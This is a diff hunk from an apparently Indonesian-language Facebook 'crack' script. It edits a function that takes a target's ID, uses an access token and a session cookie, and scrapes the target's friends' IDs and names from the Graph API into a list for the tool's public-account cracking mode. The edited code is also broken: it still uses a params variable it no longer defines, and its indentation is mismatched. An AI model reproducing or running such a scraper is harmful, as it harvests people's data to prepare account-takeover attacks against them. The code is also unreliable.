@@ -672,14 +672,12 @@ def brayen_dump():
 	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
 	pil = input(f' [+] Masukan ID Target : ')
 	try:
-		params = {
-			"access_token": token, 
-			"fields": "name,friends.fields(id,name,birthday)"
-			}
-			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
-			for c in b["friends"]["data"]:
-				id.append(c["id"]+"|"+c["name"])
-			print('>> Total Idz : {}'.format(len(id)));setting()
+		
+		koH = requests.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+		for pi in koH['friends']['data']:
+			try:id.append(pi['id']+'|'+pi['name'])
+			except:continue
+		print(f' [+] Total ID Yang Terkumpul : {}'.format(len(id)));atur_dulu()
 		except Exception as e:
 			print(e)
 #-------------------[ CRACK-PUBLIK ]----------------#
